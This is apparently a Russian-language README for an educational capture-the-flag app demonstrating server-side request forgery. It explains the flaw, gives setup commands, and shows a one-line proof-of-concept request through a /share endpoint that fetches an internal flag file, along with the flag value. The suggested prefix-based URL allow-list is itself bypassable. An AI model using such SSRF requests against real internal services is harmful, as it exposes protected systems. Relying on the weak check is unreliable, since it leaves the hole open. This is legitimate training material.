# SSRF Vulnerability Demo


Учебное приложение для демонстрации уязвимости Server-Side Request Forgery (SSRF) в веб-приложениях.

## 📖 Описание уязвимости

**SSRF (Server-Side Request Forgery)** - уязвимость, позволяющая злоумышленнику заставить сервер выполнять произвольные HTTP-запросы к внутренним ресурсам.

**Почему возникает:**
- Сервер без проверок принимает URL от пользователя
- Внутренние сервисы не защищены от запросов изнутри сети
- Фильтрация входных данных отсутствует или неполная

## 🔒 Способ защиты

 **Валидация URL:**
   ```python
   ALLOWED_DOMAINS = ['example.com']
   if not any(url.startswith(f'https://{d}') for d in ALLOWED_DOMAINS):
       return "Forbidden", 403

Клонируйте репозиторий:

git clone https://github.com/nnikk777/ctf-3.git
cd ctf-3

Соберите и запустите контейнеры:

docker-compose build
docker-compose up

Приложение будет доступно по адресу:

http://localhost:5000

  **POC**

Посмотрите статьи на сайте, это может помочь

Найдите уязвимый эндпоинт /share

Отправьте запрос к внутреннему сервису:

http://localhost:5000/share?url=http://backend:8080/flag.txt

В ответе получите флаг:

CTF{ssrf_backend_exploit}
